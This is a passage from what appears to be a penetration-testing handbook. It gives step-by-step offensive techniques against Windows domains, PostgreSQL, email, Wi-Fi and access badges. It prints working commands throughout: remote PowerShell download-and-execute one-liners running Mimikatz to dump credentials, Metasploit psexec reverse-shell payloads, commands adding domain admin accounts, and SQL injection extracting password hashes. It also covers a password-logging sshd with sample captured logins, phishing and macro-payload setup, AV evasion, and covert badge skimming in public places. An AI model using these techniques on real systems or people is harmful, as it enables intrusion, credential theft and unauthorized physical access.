PowerUp Privilege Escalation Removing your tracks is always important, so we need to make sure we set everything back to it’s original state after we get our admin account. Luckily again, harmj0y created a restore function to put the original executable back: ● powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil- Framework/PowerTools/master/PowerUp/PowerUp.ps1'); Restore-ServiceEXE - ServiceName omniserv ○ Restoring up 'C:\\Program Files\\Fingerprint Manager Pro\\OmniServ.exe.bak' to 'C:\\Program Files\\Fingerprint Manager Pro\\OmniServ.exe' ○ Removing backup binary 'C:\\Program Files\\Fingerprint Manager Pro\\OmniServ.exe.bak' Option 2: Metasploit has released a local exploitation module called Windows Service Trusted Path Privilege Escalation.{15} The concept of this vulnerability is to look for services that have unquoted paths for files it executes. In other words, if a service calls an executable like C:\\Program Files\\Demo File\\Demo.exe and it doesn’t properly quote the full path name, we can take advantage of this. If we look at the folder name from our example, \\Demo File\\, we see that there is a space between Demo and File. In Windows, this can either be treated as “\\Demo File\\” or if there happened to be a Demo.exe file in “C:\\Program"},{"pageNumber":203,"pageContent":"Files\\”, it would execute the command “\\Demo.exe File\\”. To visualize this issue, let’s look at two strings. The quoted string in the picture below is from the omniserv service from our prior example. We see that the BINARY_PATH_NAME has quotes around the executable path. However, the service name DACoreService calls a file that is not quoted. This is where the problem stems from. Unquoted Vulnerability In this example, C:\\Program Files (x86)\\Dragon Assistant\\Core\\DACore.exe, we could create a file at C:\\Program Files (x86)\\Dragon.exe and the service will treat the File Dragon.exe as input to the executable. To execute a file as a potential system user, we just need to create a service executable in the path. Let’s walk through the whole process. First, we need to identify if we have any Trusted Path Issues. From the Invoke-Allchecks above, we see that DACoreService is vulnerable to the unquoted service path vulnerability. ● [*] Checking for unquoted service paths... ● [*] Use 'Write-UserAddServiceBinary' to abuse ● [+] Unquoted service path: DACoreService - C:\\Program Files (x86)\\Dragon Assistant\\Core\\DACore.exe Let’s take advantage of it.

Owning The Network With Credentials And Psexec: In my last book, once you had a username and password, if you wanted to get another Meterpreter shell on another host, you had to use psexec. The problem was that the default payload would trigger most AV systems, so we had to create a Meterpreter payload first using Veil and attaching that. Let’s go through that first to see what we used to do: ● Go to Veil located in /opt/Veil and execute ./Veil ● list and use payload ● set your LHOST and LPORT ● generate using pyinstaller ● Now go to metasploit, use psexec with the custom payload ○ msfconsole ○ use exploit/windows/smb/psexec ○ set PAYLOAD windows/meterpreter/reverse_https ○ set LHOST [IP of My Box] ○ set LPORT 443 ○ set SMBUser TestAccount ○ set SMBPass MyPassword ○ set SMBDomain fakeDomain ○ set EXE::Custom /root/veil-output/compiled/veil_file.exe ○ set RHOST [IP of Remote Host] This worked great in the past and we were able to get around AV. Additionally, I have seen some AV in the past year start picking up on python executable payloads. As seen throughout the book, this is definitely is a cat and mouse game. That is what makes penetration testing so much fun. This is where psexec_psh comes into play. Just like psexec, what psexec_psh does is mimic the sysinternals tool psexec to log into the victim host and execute a payload. What psexec_psh does differently is use PowerShell encoded commands to mimic the old psexec. You will get back a Meterpreter shell, but this time nothing will touch disk at all. No need to create a custom payload to evade AV. ● use exploit/windows/smb/psexec_psh ● set RHOST 172.16.151.202 ● set SMBUser lab ● set SMBPass '!Asdfasdfasdf1!' ● set SMBDomain hacker.testlab ● set LHOST 172.16.151.141"},{"pageNumber":206,"pageContent":"● set PAYLOAD windows/meterpreter/reverse_https ● exploit psexec_psh Now moving laterally through the network becomes that much easier and that much more silent. Once we have a successful Meterpreter session, we will interact with that session with the command: ● sessions -i [session number] One of the common next steps is to run Mimikatz against the system. If you run into a system that is a 64-bit system, you will have to first migrate into a 64-bit process. The reason I want to utilize a 64- bit process is because that is the only way Mimikatz will be able to look for the clear text passwords in 64-bit systems. If it is a 32-bit system, you can still migrate into another process if needed, but it might not be necessary. To list all of the processes, we will use the \"ps\" command. To migrate, we will use the command \"migrate [pid]\". In the example below, we identified Notepad running as a 64-bit process and migrated into it. ● ps ● migrate [pid of a x86_64 process] You might need to become \"system\" before doing any of these commands. You can do this by issuing the following command: ● getsystem ● If you get denied and are a local admin, see the Bypass UAC section. Once migrated and running as system, we want to load Mimikatz and type the command kerberos (or"},{"pageNumber":207,"pageContent":"you can use wdigest).

Psexec Commands Across Multiple IPS (Kali Linux) Since we have credentials that have local administrative access, there are times where I don't want to compromise every host, and instead, just run commands on these hosts. For example, some commands you may want to run on all hosts are: ● net group \"Domain Admins\" /domain (list all Domain Admins on servers) ● qwinsta (list about user session information) ● Create Additional Administrative Accounts on All Hosts ○ net user username password /ADD /DOMAIN ○ net group \"Domain Admins\" username /ADD /DOMAIN ○ net localgroup Administrators username /ADD Royce Davis took the original psexec code and modified it so it does not upload any binaries, but achieves command line remote code execution in memory.

In the previous command, I was able to run the qwinsta command on every host and link IPs with usernames. If I have a list of IT administrators, I can directly attack their box instead of compromising all the hosts on the network. Move Laterally With WMI (windows) A better option to move laterally is using WMI or Windows Management Instrumentation. WMI is used to manage systems and is installed by default on all new Windows operating systems. We can take advantage of WMI to remotely execute commands on other systems on which we have access. Since we have compromised our victim and pulled hashes, we can now find an account with elevated privileges and run commands on remote hosts using those credentials. In the example below, we compromised a user “testuser1” that has access to another host. We can use WMI to execute Mimikatz remotely, write it out to a file in the public folder, and read that file: ● wmic /USER:\"hacker\\testuser1\" /PASSWORD:\"!Asdfasdfasdf1!\" /NODE:172.16.151.201 process call create \"powershell.exe -exec bypass IEX (New- Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke- Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\\\Users\\\\public\\\\a.txt\" ● dir \\\\win8\\c$\\Users\\Public\\ ● type \\\\win8\\c$\\Users\\Public\\a.txt ● del \\\\win8\\c$\\Users\\Public\\a.txt As you can see from the image below, we are currently on the host win7.

On versions of PostgreSQL v9.5 and earlier (remember that most orgs that I found do not regularly patch PostgreSQL), lies a vulnerability that allows a pass-the-hash authentication. This was originally found by Jens Steube and Phillipp Schmidt and allows an attacker to authenticate to PostgreSQL databases that utilize ChallengeResponse Authentication using the AUTH_REQ_MD5 method or simply configuring \"md5\" as the Host Based Authentication (HBA) in pg_hba.conf.{21} Here is their amazing paper on how they discovered that during the authentication process, the actual password is not checked, but instead has the hash: https://hashcat.net/misc/postgres-pth/postgres-pth.pdf . Let’s say you are on an internal penetration test, and you used SQLMap or a similar tool to identify an SQL injection on a web page that utilizes a postgreSQL backend. It might look something like: ● http://postgres.suck.testlab/search.php?search=weapons'union select"},{"pageNumber":217,"pageContent":"null,concat(usename,passwd) FROM pg_shadow-- ● http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet The result will be a list of hashes of all the users: ● postgres,md532e12f215ba27cb750c9e093ce4b5127 ● secretloginmd598d21549d6420160b54f7898a7ff60cc ● john,md5cbfaf1e32c711ee7ba63b5b65f8a777b ● test,md505a671c66aefea124cc08b76ea6d30bb We could spend time dropping it in oclhashcat and trying to crack the passwords, but due to the PTH issues, we can actually connect to all the other postgresql servers with just the hash. Let’s walk through how this is done. We are going to pull a copy of postgresql onto our box, download the patch, apply the patch, and configure and install our modified version of psql. Psql is just an interactive terminal to connect to postgres. With our modified version, we can now supply hashes instead of passwords. I tested this with Postgres Commit: a2e35b53c39b2a27d3e332dc7c506539c306fd44 ● mkdir /opt/postgresql/ && wget https://github.com/postgres/postgres/archive/a2e35b53c39b2a27d3e332dc7c506539c306fd44.zip && unzip a2e35b53c39b2a27d3e332dc7c506539c306fd44.zip -d /opt/ && mv /opt/postgres-a2e35b53c39b2a27d3e332dc7c506539c306fd44 /opt/postgresql/ && cd /opt/postgresql/ ● wget https://hashcat.net/misc/postgres-pth/postgresql_diff_clean.txt ● git apply postgresql_diff_clean.txt ● ./configure ● make && make install ● cd /usr/local/pgsql/bin/ ● ./psql -h [IP of PostgreSQL server] -U postgres ● Supply hash of the postgres user But why stop there?

If it is not, you will have to uninstall PostgreSQL before installing the vulnerable version. Once installed, create a new user (in this case “thp”), create a database, and print out the hash: ● sudo -u postgres psql ● create user thp createdb createuser password 'thp'; ● create database thp owner thp; ● select (usename,passwd) FROM pg_shadow; ● Grab the created hash password for the “thp” user ● Run the example above, but instead of the user “postgres” use “thp” Pulling Cached Credentials Did you ever try to log onto your laptop while you weren’t on the network? How can you authenticate without being connected to the domain? It is because Windows stores the last ten users with successful logins by default. If we can dump this, this is another way to find additional credentials. We won’t be able to pull these passwords in clear text, so we will have to try to crack these credentials. What types of users might you see? Of course the user of the laptop, but you will usually also find an account like “helpdesk” or similar, as they originally set up the machine. In the next example, we will assume you already have a Meterpreter shell on our victim host and we will use Metasploit’s cachedump module to pull these creds."},{"pageNumber":219,"pageContent":" Within Metasploit, we will can use cachedump (with Local Admin privileges): ● use post/windows/gather/cachedump ● set SESSIONS 1 ● show options ● exploit [*] Executing module against win7 [*] Cached Credentials Setting: - (Max is 50 and 0 disables, and 10 is default) [*] Obtaining boot key...

Although mscash2 hashes are extremely valuable, the amount of time it takes to crack might not be feasible on a one-week penetration test. This could be used for more long-term attacks. Attacking The Domain Controller: If you were lucky enough to get a local administrative account or a domain admin account, the next target is usually the Domain Controller (DC). One of the happiest moments for any pentester is when they successfully pull all the hashes out of the DC. Even with administrative credentials, we don't have access to read the hashes on the Domain Controller that are stored in the c:\\Windows\\NTDS\\ntds.dit file. This is because that file is read- locked as Active Directory constantly accesses it. The solution to this problem is to use the Shadow Copy functionality natively in Windows to create a copy of that file.{22}"},{"pageNumber":221,"pageContent":" SMBExec (https://github.com/brav0hax/smbexec) (Kali Linux) This is where a tool called SMBExec comes into play.

PSExec_NTDSgrab ( http://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_ntdsgrab ) (Kali Linux): Another great way to dump hashes is with a metasploit module called psexec_ntdsgrab. Similar to SMBExec, PSExec_NTDSGrab “authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM hive copy can be used in combination with other tools for offline extraction of AD password hashes.

I have found that there are tons of different ways to accomplish this (even the cheap method of dropping the binary in startup), but here are a few of my tricks. Veil And Powershell Veil has been great for evading AV, but it can also create PowerShell Meterpreter executables. I really prefer having PowerShell files over actual binaries, just because you never know what AV might pick up on.

Once re-posted, we will configure a schtask to run once a day and connect back to our Meterpreter handler. {24} First we need to grab a copy of invoke-shellcode and modify it. We will use our Kali host machine to modify the invoke-shellcode script. ● cd /opt/PowerSploit/CodeExecution As we said before, we are limited in space, so we are going to copy the original file to a shortened file: ● cp Invoke-Shellcode.ps1 1.ps1 Next, let’s go ahead and edit 1.ps1 script and add our reverse shell information at the bottom of this ps1 file.

Since explaining exactly how Kerberos and Kerberos Tickets work is pretty complicated, I will direct you to a SANS blog article that covers this topic well. Full Link: http://digital-forensics.sans.org/blog/2014/11/24/kerberos-in-the-crosshairs-golden-tickets-silver- tickets-mitm-more Bit.ly Link: http://bit.ly/1DK0kaS In short, Kerberos is used as an authentication and authorization platform, which uses tickets. What if you could create you own tickets to authenticate to any server? That is exactly what the Golden Ticket could do. On the topic of persistence, let’s say you have compromised a Domain Controller in the past and dumped all the hashes. Your client tells you a week later that they fixed all the vulnerabilities that you identified to get Domain Admin and changed all the passwords. They hire you again to see what you can do. You do the normal social engineering to get your initial shell, but now you are only a limited user. All the initial entry points are now blocked and they have limited scanning detection/prevention. With the Golden Ticket, you don’t have to worry about anything. You can take the old krbtgt hash from the previous hash dump and promote yourself back to a Domain Admin. Best of all, you can do all this with an unprivileged account. A few things you need to know about the krbtgt: ● It is not recommended to reset the system generated password. It could break the whole domain. Therefore, it is generally never changed. (Although Microsoft recently released a tool to handle resetting the krbtgt account). ● Even if you change every password for every domain admin, you can still become a DA. ● The only time I have seen the system generated password changed is from a function 2003 to 2008 upgrade. ● You can create Users and Groups that don’t exist with the Golden Ticket.

There are a large number of attacks that can help in both lateral movement and privilege escalation, but it really comes down to understanding what is in scope of your test and what has the highest probability of assisting you. It might take a few of the attacks in the Lateral Movement section to get you to a Domain Administrator, but keep this chapter handy as sometimes you will run into a brick wall and something in this book might just get you out of a jam. "},{"pageNumber":243,"pageContent":"The Screen - Social Engineering If client attacks are in the scope of your tests, social engineering is your \"go to\" attack. There are many different ways to perform social engineering attacks and these can range from domain attacks to spear phishing, or even dropping USB sticks. Since social engineering attacks really use your own creativity, I will just go over a few examples that I have found to be fruitful. Doppelganger Domains I spent a lot of research time looking into doppelganger domains and trying to find the most efficient and most “bang for your buck” attacks. You can find more in my research paper here: http://www.wired.com/threatlevel/2011/09/doppelganger-domains/ . The concept of my research paper was to brute-force company domains for valid subdomains that had MX records. For my next few examples we have two different fictitious companies who utilize their sub-domains for email: us.company.com and uk.company.com. What I had done was to purchase all domains for uscompany.com, ukcompany.com and so on. This is because end users very frequently make the mistake of forgetting to type in the period between the domain and sub-domain. SMTP Attack Once I purchased these domains, I set up an SMTP server, configured the MX records, and finally set all SMTP servers as catch-all servers. This means that if anyone emails to the domain I own, regardless of to whom it is sent, I would record/forward all those emails to an account of my choice. This is usually enough to prove that you can successfully capture sensitive data and that you will see a lot of sensitive emails from the corporation. If you go to the article above, you will see what type of data was gathered and how many times we were able to get SSH/VPN/Remote Access into a company. We also took this proof of concept attack one step farther. In the following example, we are targeting the fake site bank.com, who has a subsidiary in Russia. The fake bank owns ru.bank.com and has MX records to that FQDN. Also, company.com (another fake company), owns us.company.com and has MX records for that FQDN. In this fake example, we purchase both the doppelganger domains uscompany.com and rucompany.com. If anyone mistypes an email to either domain, we will be able to inject ourselves into the middle of this conversation. Using a few simple python scripts, when we receive an email from john@us.company.com to bob@rubank.com (mistyped doppelganger for ru.bank.com), our script will take that email and create a new email to bob@ru.bank.com (the proper email address) and sourced from john@uscompany.com (the mistyped doppelganger that we own). That means any reply response to John from Bob will come back through us. Now, we have a full \"Man in the MailBox\" configured and can either just passively listen or attack the victims based on the trust factor they have with each"},{"pageNumber":244,"pageContent":"other. Man in the MailBox Example SSH Attack During my research, I also configured SSH servers with the doppelganger domains to see if people mistyped SSH servers and revealed their SSH passwords. There are a couple of things that need to be configured for a successful attack. First, set the DNS A record to point all records to a particular IP. For example, I set the A record host to \"*\" and pointed the host record to my IP address. Any subdomain within the doppelganger will point back to my server. This means the following domains will all point back to a single IP: ● test.uscompany.com ● dev.uscomany.com ● deadbeef.uscompany.com Then, set up an SSH server that logs both the username and password. In my case, I configured a server running Ubuntu 11.10. Since normal sshd does not record the passwords, I had to modify a version of sshd. This is done by downloading openssh portable 5.9p1: wget http://mirror.team-cymru.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz To Extract OpenSSH: ● tar xvfz openssh-5.9p1.tar.gz ● Go into the openssh directory: ○ cd openssh-5.9p1 It is required to modify the auth-passwd.c file before compiling sshd.

After replacing the auth-passwd.c file, let's compile and make it: ● sudo ./configure --prefix=/opt --sysconfdir=/etc/ssh ● make ● sudo make install I should have a working version of our new sshd service. To start sshd: ● /opt/sbin/sshd Then, run the command and you should see username password combinations scroll by: ● tail -f /var/log/sshd_logged Output: ● root: Harmon01:192.168.10.10 ● admin: AMW&369!: 192.168.10.111 ● tomihama: tomihhama:192.168.10.24 ● root: hx7wnk:192.168.10.19 We are successfully recording username/password combinations. You will have to be extremely patient with this attack and hope a developer or IT user mistypes the domains to SSH. I love these attacks because they are not the normal types of attacks and give you the chance to get creative with them. Phishing Phishing, or email in general, is one of the most commonly used and effective vectors for remote attacks. This is because they rely on users as victims, instead of unpatched or misconfigured services."},{"pageNumber":246,"pageContent":"Victims can be easily swayed to perform actions generally based on fear and urgency. The fear and/or urgency usually stems from some type of financial loss, personal loss, or the fear of missing out. If you can trigger one of these emotions, it can cause a victim to do things they wouldn’t normally do. Although there are numerous books on manipulating people, two books I would recommend: ● Behavioral Programming (2015): The Manipulation of Social Interaction - http://amzn.to/1CJGb4y ● Social Engineering: The Art of Human Hacking (2010) - http://amzn.to/1CJH3pQ These books describe types of social interactions, manipulation of people, word selection, and many tools for all methods of social engineering. In the first THP, I focused on using Metasploit pro, but I decided to go with open source in this example, which allows me to get more creative. After setting up a few phishing exercises, you will see that it is pretty easy. There are plenty of open source phishing tools, such as: ● Catero: http://section9labs.github.io/Cartero/ ● Phishing Frenzy: http://www.phishingfrenzy.com/ ● Social Engineering Toolkit: https://github.com/trustedsec/social-engineer-toolkit However, after running numerous phishing attacks, I found that having numerous custom scripts ready for different scenarios works best. Although this might not work for your situation, this should help you get different ideas for a successful campaign. Manual Phishing Code ( https://github.com/cheetz/spearphishing )(Kali Linux): This is a sample beta code I have written to take care of my spear phishing campaigns. The code repository is located here: https://github.com/cheetz/spearphishing and it is really up to you to customize it for your own campaign. In the default code, we are going to use GoDaddy’s SMTP services, but you can easily customize it according to your own SMTP server. The spear.py client script will modify an html page that will get sent to all it’s victims. Take time to read and understand the code before executing. Let’s walk through a phishing example. Setting up the client to send out emails: ● cd /opt/spearphishing/client ● edit spear.py and modify the following: ○ domain = \"suck.yourdomainthatyouown.com\" #The Domain That You Own ○ company_name = \"SUCK\" #The Company Name ○ me = \"auto-confirm@\" + domain #Email return address ○ host = 'smtpout.secureserver.net' #Godaddy SMTP server"},{"pageNumber":247,"pageContent":"○ login = '' #Godaddy Login ○ password = '' #Godaddy password ○ edit emails.txt and add email addresses To run the SMTP script : ● python ./spear.py Sample Spearphishing Email If you look closely at the bottom, all URLs point to our domain with both the session ID and ge ID. One thing you need to do is heavily test your phishing exercises. There are some phishing campaigns that get flagged as SPAM and others that don’t. You need to find that right balance. Web Filtering Bypass for Your Domains: Once in a while, I will see a company actively using a web proxy for all of their Internet traffic. In this situation, anything that isn't categorized will be blocked and my reverse shells can’t seem to work around their filter. However, there are things you can do to help your success rate. For doppelganger domains that I have purchased specifically for testing, I set up a simple CNAME or Canonical Name on that domain to point to the original domain that I have doppelgangered. I will let that doppelganger domain sit there for a few days or weeks before the test. Why? This will allow the site to get automatically crawled by a number of different systems. When the crawlers see the CNAME configured to the real site, they will assume that it was purchased by that company and turn that domain into the same category of approved domains. Once your test starts, just remove the CNAME and configure the IP of the actual malicious server.

There are a lot of different tools that can be purchased to provide spear phishing campaigns, but most are limited in the types of sites or templates that are included. Social Engineering with Microsoft Excel In the first book, I explained how to add macros manually to create malicious Excel payloads that can be used in Spear Phishing Campaigns. This section is an extension of that. Sometimes you find yourself in an environment where you can't use JAVA or web-based attacks. It might be because you have to deliver your payload via an email attachment or want to use physical media for your attack (i.e. USB sticks or CDs). One of the best success rates I have had with these types of attacks was by utilizing a trust relationship between the attacker and victim and including an Excel spreadsheet that had a Meterpreter payload. When I say a trust relationship, I mean find someone with whom the victim might regularly communicate files and spoof his or her email address. Even better, in the initial Compromised List section, you might have been able to gain a few credentials. Log into the corporate Outlook Web Access (OWA) mail server and start emailing employees that have regular communication with your compromised credential. The problem with using Metasploit to generate its own Excel files is that a lot of times they will trigger anti-virus. To mitigate this, we are going to use the same tactics we did in the Lateral Movement section and take advantage of PowerShell. On your Windows Attacking Host, download Generate-Macro.ps1: https://raw.githubusercontent.com/enigma0x3/Generate-Macro/master/Generate-Macro.ps1 Generate-Macro.ps1 creates a malicious Excel file with a PowerShell payload to connect back to a Metasploit Meterpreter handler.

"},{"pageNumber":256,"pageContent":"The Onside Kick - Attacks That Require Physical Access The onside kick is a dangerous tactic that provides huge beneficial results. The problem with these types of attacks is that they generally require close proximity and have high potential of alarming your victim. In this chapter, I will explain how to exploit wireless networks, card cloning, creating a penetration drop box, and dropping USB sticks. Please remember, if you are going to do these types of attacks, then get written approval from the company with which you are working. Exploiting Wireless Before we begin talking about exploiting wireless, I want to state that many of the basic attacks for WIFI haven’t changed from the previous book. To eliminate the need to carry two books, I have included the relevant WIFI material from the last book along with the newer attacks. I am often asked what the best card is for wireless sniffing and attacking. I don't have the exact technical comparison, but from my experience, I have had the most success and luck with the Alfa AWUS036NHA.{31} This USB wireless adaptor supports 802.11 a/b/g/n and works natively with Backtrack and Kali. This card also uses the Atheros chip set, of which I am a big fan. The reason that I use a USB wireless card is that my Kali system is generally a VM, which can't utilize the native built-in wireless card. Passive - Identification and Reconnaissance Passive WIFI testing puts the WIFI card in a sniffing mode to identify access points, clients, signal strengths, encryption types, and more. In a passive mode, your system will not interact with any of the devices, but this mode is used for recon/identification. To start any WIFI assessment, first kick off Kismet. Kismet is a great WIFI tool to sniff, identify, and monitor wireless traffic. At any terminal window in Kali, type: ● kismet This will open the Kismet application, which will need your wireless interface information (you can do a quick ifconfig on a separate terminal window to find this information). In this case, my wireless interface is on wlan1. If everything works properly, you can close that window (try pressing the tab button if you are stuck) and you will see a listing of all the SSIDs, channels, signal strength, and more.

Active Attacks After you identify the networks you are to attack or networks that are within scope of your assessment, you need to figure out which active attacks to use. We are going to focus on four main types of attacks–those against WEP, WPAv2, WPA WPS, and WPA Enterprise. One thing I want to reiterate is that we are going for the quickest and easiest way to crack wireless passwords or gain access to a wireless infrastructure. There are many different tools to attack WIFI (aircrack-ng http://www.aircrack-ng.org/ is one of my favorites), but I will focus on getting the job complete. WEP - Wired Equivalent Privacy We should all know by now that using WEP for wireless networks is insecure. I won't go into the details, but if you want to read about how it was implemented and configured improperly, you can visit the Wikipedia page: http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy ."},{"pageNumber":259,"pageContent":" If the organization is utilizing WEP and has at least one client, you should be able to crack the WEP password without an issue. To accomplish this, we are going to use the Fern-Wi-Fi-Cracker tool to identify WEP networks and attempt to crack them. I am using Fern-Wi-Fi-Cracker because it is native to Kali and utilizes Aircrack-ng (which is my favorite Wi-Fi tool). One quick caveat: for the example below, the access point you are attacking needs to have at least one active host on that network. There are ways to get around this (search Newsham's Attack), but I won't go over them in this book because the following attack is the most common situation you will run into. How to Crack WEP in Kali: ● At a command prompt, type: ○ fern-wifi-cracker ● Select the drop down and pick your Wi-Fi (most likely wlan0) ● Click the Scan button ● And drop into WEP (the red Wi-Fi sign) Fern WIFI Cracker ● Select the SSID you want to attack (in this case, Rocket) ● Click on Wi-Fi Attack on the right side ● Watch the IV count.

WPAv2 (TKIP) - Wi-Fi Protected Access WPAv2 doesn't have a vulnerability like WEP, so cracking the password is much more difficult. To have a successful attack, you need to capture the authentication handshake from a client to the access point. To cheat in this process, we can force a user to de-authenticate and then re-authenticate. Once we capture the handshake, we won't be able to just strip the password out–we will have to brute- force or crack the password. Let's see this in progress. Before we can start sniffing, we need to enable the capture file settings within Fern-WiFi-Cracker, in order to use this handshake file to crack. ● At a command prompt, type: ○ fern-WiFi-cracker ● Go to the ToolBox ● Click on the WIFI Attack Options ● Select Capture File Settings "},{"pageNumber":261,"pageContent":"Enabling Capture File Settings ● Hit ESC until you are back at the home screen of Fern-Wifi-Cracker ● Select the drop down and pick your Wi-Fi (most likely wlan0) ● Click the Scan button ● And drop into WPA (the blue Wi-Fi sign) ● Select your SSID to attack ● Click on WIFI Attack ● In the following image, you will see the cap file created "},{"pageNumber":262,"pageContent":"WPA Handshake Capture We need to first clean the cap file to make sure it will work with our password cracker.

WPAv2 WPS (Wi-Fi Protected Setup) Attacks WPS (originally known as Wi-Fi Simple Config) was created to make it simple to establish a secure connection to a wireless router/access point.{34} All you need to do is to enter a PIN when connecting to an access point without knowing the long complex password. The issue stems from the fact that the PINs required could be brute-forced relatively quickly.{35} What's even better is that on some access points you cannot disable WPS even if you turn it off in the configuration page. As you saw previously with Kismet, the manufacturer of the device can be identified via passive sniffing. Here is a Google document that lists a large number of vulnerable devices and the tools that could be used to attack WPS: http://bit.ly/1eRN0qj .

Now, take these credentials and log back into their wireless network. Wifite ( https://github.com/derv82/wifite )(Kali Linux) Wifite is another WIFI attacking tool that I highly recommend using. With similar functionality to fern- wifi-cracker, Wifite is another gui-front end to Aircrack-ng and Reaver. In certain cases, I found Wifite to work better than my other tools.

In this case, we will attack ESSID number 5. Once selected, this will kick off the WEP attack to capture and crack IVs. Successful Attack That’s pretty much it. Even better, if the access point isn’t vulnerable to WEP attacks, but is vulnerable to WPS and utilizes WPAv2, Wifite will kick off Reaver to attack WPS. If that is unsuccessful, it will attack WPA by disassociating clients and capturing the authentication handshake.

Badge Cloning The standard in HID Badge cloning is the Proxmark 3.{38} Although this RFID tag reader/writer is a little pricey ($400+), it is a must have. It is important to understand frequency and card types. The kit from the HackerWarehouse comes with the following: ● Low Frequency Antenna – Tuned to operate at 125 kHz and 134 kHz and is capable of reading proximity cards at a distance of 4cm. ● High Frequency Antenna – Tuned to operate at 13.56 mHz and is capable of snooping the UID of a Mifare 1k classic card at a distance of 3cm. ● Tag bundle – Includes three type of RFID tags: T5557 (EM4100, HID and indala compatible, 125 kHz) read/write card, Mifare 1K (13.56 mHz) test card, and EM4100 (125 kHz) test card. ● Prox Box The most common HID badge card I see is the ProxCard II. This card has been around for a long time due to the low cost and ease of use, and is commonly seen in small/medium size companies. Many companies that rent space from a shared office building usually do not have a choice in which card their building uses. This also means these types of cards won’t be going away anytime soon. Penetration testers love the ProxCard II because it does not have any encryption or require challenge/response authentication by default. Some companies use high frequency cards like Mifare, which use crypto; however even these have been found to be vulnerable.{39} In this demonstration, we will focus on the ProxCard II. "},{"pageNumber":269,"pageContent":"Proxmark3 Out of the box, the Proxcard II will need to be updated. I won’t go through every step, but a great place to get you started is located here: https://github.com/Proxmark/proxmark3/wiki/Windows I did have some issues trying to get the Proxmark3 to work. So, I have included my notes to help you get through the troubleshooting process. After the initial driver installation located in section - UPDATE PROXMARK TO THE NEW CDC Serial INTERFACE: ● After I did FLASH New Bootrom in procedure 2 and let go of Proxmark button, it still only showed up under libusb-win32 device instead of on a COM port. ● I first followed the WINDOWS PROBLEMS IN RECOGNIZING COM PORT section to update the drivers while the button was pushed. ● After completing that, I let go of the button, I unplugged again, pushed button, replugged in, COM port showed up (only while button is pushed), and I went ahead and updated the FLASH - Bootrom.bat, FLASH - FPGA fullimage.bat, and FLASH - OS.bat. After that, I let go of the button and everything worked like a charm. Now, if everything is working, run the: proxmark3.exe [com port] There are many proxmark3 commands{40}, but we will go through the ones that matter. ● lf hid fskdemod - Realtime HID FSK demodulator (Read HID tags) ● lf hid clone - Clone HID to T55x7 (Write Tag ID) to a blank card 1 . First put the Proxmark3 into a listener mode. Any card that is within an inch of the reader will show the HID tags. 2 . After we remove the HID card we want to clone, we are going to configure the Proxmark3 to write back to a blank card. Put the blank card on the Antenna and use the command” lf hid clone"},{"pageNumber":270,"pageContent":"[TAG ID]” to write to that card. 3 . We need to verify that we wrote to that card by putting the Proxmark3 back in listener mode and making sure our new cloned card has the proper HID tags. Proxmark3 - Badge Cloning Once you have your device configured, you can connect the external battery back to the Proxmark3, however, you can only clone one badge at a time. To get around this problem and the battery pack issue, we turn to Kali Nethunter and a Nexus 7 tablet. Get It Working In Kali Nethunter ( https://forums.kali.org/showthread.php?23151-Tutorial-make-proxmark3-works-with-nethunter ): 1 . Download http://thehackerplaybook.com/Download/proxdroid-bin-848.rar 2 . Inside the proxdroid rar file, you need to copy the file /system/bin/proxmark3 to the Nexus’ /system/bin directory. Make sure to change the permissions to [rwxr-xr-x] (chmod 755 /system/bin/proxmark3) 3 . Next, you need to copy both /system/lib/libreadline.so and /system/lib/libtermcap.so from the rar to the /system/lib directory with permission to [rw-r--r--] (chmod 644) 4 . We need to find out which port the Proxmark3 is using when connected to the Nexus Device. A quick way to do this is: dmesg 1 .

Moreover, the issue with running it off a laptop is the size. With the Nexus tablet and a tablet case, I am able to power and run the Proxmark3 software with full functionality. Holding the tablet case, I can easily go in an elevator/subway/bus, hold my tablet case near everyone’s badge and constantly collect them. I can then write them out to cards and use them to walk right in. One other thing that I have seen from collecting tag IDs is that companies generally buy tags in bulk. The HID tag IDs are set at the manufacturer site, so if you collect a number of tags, you can figure out the ranges in which they exist. For example, in the example tag above (2004520045), we can brute- force through the tags near that range. Since different badges have different permissions, it is good to test if you are able to guess a privileged badge using something like: https://github.com/brad-anton/proxbrute . Kon-Boot ( http://www.piotrbania.com/all/kon-boot/ ) (Windows/OS X) On a physical test, you might have gotten into the building, but you need a quick and easy way to get onto systems and servers. This is where Kon-boot comes into play. Kon-boot is a USB device that will allow you to bypass authentication on both Windows and OS X. On Windows, Kon-boot has additional functionality to bypass without changing the password. However, on OS X, you need to either reset the password to blank or create a new user.

The installation is pretty straightforward. After you purchase the corporate version of Kon-Boot, you will get a Windows executable. Take any USB stick and it will install Kon-Boot onto that device. All you need to do now is carry this little USB device: KON-BOOT USB Stick Windows On a reboot or system startup, make sure it boots from the USB drive so that Kon-Boot will kick in. Kon-Boot Bootup After Kon-Boot finishes, you will come to a login screen with no password configured. Just hit “enter” and you will be in the system. Another benefit is that it installs the sticky key functionality to popup a system shell.

Pentesting Drop Box - Raspberry Pi 2 On a physical engagement, a pentesting drop box is essential to have in your toolkit. You can clone a couple badges, sneak your way into a company, drop a device onto the corporate infrastructure, and run. Either your drop box connects back via cellular or Wi-Fi, or it creates a remote shell back to a server of your choice. The big professional version of this is called a PwnPlug and you can purchase one from here: http://pwnieexpress.com/products/pwnplug- elite. The only problem is that the cost is pretty outrageous and the chance of losing your device is pretty high. In the previous Hacker Playbook, we used the oDroid U2, because of the speed and RAM requirements. The only downside was that although it was a fraction of the price of the PwnPlug, it still came to about $100 per box. If you have done a physical test before, you know you have lost a few in the process and $100+ adds up quick. Luckily for us, the Raspberry Pi 2 was released, which is now six times faster (900 Mhz Quad Core) and has 1GB of RAM.{43} You will have to buy a few items separately from the board, but not much:"},{"pageNumber":276,"pageContent":"● Power Adaptor ● USB Wi-Fi adaptor ● 8 GB or larger microSD Class 10 or higher card ● HDMI to view what is going on when booting the first time Raspberry Pi 2 Running Kali Linux Download Kali Linux 